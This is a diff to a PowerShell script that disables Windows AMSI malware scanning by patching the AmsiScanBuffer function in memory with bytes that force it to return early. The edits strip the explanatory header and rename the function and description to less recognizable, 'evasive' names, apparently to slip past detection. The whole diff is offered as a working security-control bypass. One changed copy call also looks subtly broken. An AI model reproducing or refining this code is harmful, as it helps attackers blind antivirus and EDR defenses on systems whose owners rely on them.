@@ -1,19 +1,12 @@
 <#
-.SYNOPSIS
-Microsoft has developed AMSI (Antimalware Scan Interface) as a method to defend against common malware execution and protect the end user. 
-By default EDRs consumes AMSI events as part of interpreted script detection during runtime, its also the first protection against obfuscation.
 
 .DESCRIPTION
-Antimalware Scan Interface by patching AmsiScanBuffer function 
+Evasive Antimalware Scan Interface patching
  
 .EXAMPLE
-Invoke-AmsiBypass1
+Invoke-bypass2
  
-Description
------------
-Patching AmsiScanBuffer
 #>
-
 
 $K2 = @"
 
@@ -76,7 +69,7 @@ If ([IntPtr]::Size -eq 8) {
     )
 }
 
-function Invoke-AmsiBypass2 {
+function Invoke-bypass2 {
     [CmdletBinding()]
     [OutputType([string])]
     Param
@@ -95,10 +88,9 @@ function Invoke-AmsiBypass2 {
 		$p = 0
 		[K2]::vp($targetedAddress, [uint32]2, 0x4, [ref]$p) | Out-Null
 		$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3,0xC3)
-		[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 7)
+		
+		[System.Buffer]::BlockCopy($Patch, 0, $Address, 7)
 		$b=0
 		[K2]::vp($targetedAddress, [uint32]2, $p, [ref]$b) | Out-Null
-
     }
-
 }
